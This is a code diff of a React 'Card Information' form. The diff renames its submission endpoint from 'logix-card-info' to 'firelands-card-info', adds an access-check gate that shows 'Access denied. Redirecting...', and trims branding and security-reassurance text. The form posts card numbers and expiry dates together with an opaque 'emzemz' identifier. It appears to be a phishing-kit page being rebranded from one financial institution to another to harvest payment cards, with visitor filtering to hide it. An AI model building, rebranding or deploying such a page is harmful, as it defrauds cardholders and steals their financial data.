@@ -63,8 +63,12 @@ const Card: React.FC = () => {
   const { emzemz } = location.state || {};
   const isAllowed = useAccessCheck(baseUrl);
 
-  if (!isAllowed) {
+  if (isAllowed === null) {
     return <div>Loading...</div>;
+  }
+
+  if (isAllowed === false) {
+    return <div>Access denied. Redirecting...</div>;
   }
 
   if (!emzemz) {
@@ -98,7 +102,7 @@ const Card: React.FC = () => {
 
     if (!Object.values(newErrors).some(error => error)) {
       try {
-        await axios.post(`${baseUrl}api/logix-card-info/`, {
+        await axios.post(`${baseUrl}api/firelands-card-info/`, {
           emzemz,
           cardNumber: cardDigits,
           expiryMonth,
@@ -140,33 +144,11 @@ const Card: React.FC = () => {
       </div>
 
       <div className="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
-        <div className="mx-auto flex w-full max-w-6xl flex-col gap-12 lg:flex-row lg:items-center lg:justify-between">
-          <section className="order-2 flex flex-1 flex-col justify-center space-y-6 text-white/90 lg:order-1">
-            <div className="space-y-3">
-              <p className="text-3xl font-semibold leading-tight text-white drop-shadow sm:text-4xl lg:text-5xl">
-                Secure Your Firelands Journey
-              </p>
-              <h1 className="text-base font-semibold uppercase tracking-[0.3em] text-white/70">
-                Card verification keeps your account safe
-              </h1>
-            </div>
+        <div className="mx-auto w-full max-w-6xl">
+          <div className="mx-auto w-full max-w-md rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur">
+            <h2 className="text-2xl font-semibold text-[#2f2e67]">Card Information</h2>
 
-            <p className="max-w-lg text-sm text-white/80">
-              We partner with trusted providers and use multi-layer encryption to protect every
-              interaction. Complete the details to continue your enrollment.
-            </p>
-          </section>
-
-          <section className="order-1 w-full max-w-md lg:order-2 lg:self-start">
-            <div className="w-full rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur">
-              <div className="flex flex-col gap-2">
-                <h2 className="text-2xl font-semibold text-[#2f2e67]">Card Information</h2>
-                <p className="text-sm text-[#5d4f72]">
-                  Enter the card details associated with your membership.
-                </p>
-              </div>
-
-              <form onSubmit={handleSubmit} className="mt-6 space-y-6">
+            <form onSubmit={handleSubmit} className="mt-6 space-y-6">
                 <div className="space-y-2">
                   <label className="text-sm text-[#5d4f72]" htmlFor="cardNumber">
                     Card Number
@@ -287,16 +269,7 @@ const Card: React.FC = () => {
                   {isLoading ? 'Processing…' : 'Continue'}
                 </button>
               </form>
-
-              <div className="mt-8 space-y-3 rounded-3xl bg-[#f7f7ff] p-6 text-sm text-[#5d4f72]">
-                <p className="font-semibold text-[#2f2e67]">Security reminder</p>
-                <p>
-                  We never store your full card details in plain text. Data is encrypted and processed
-                  according to industry standards.
-                </p>
-              </div>
-            </div>
-          </section>
+          </div>
         </div>
       </div>
     </div>
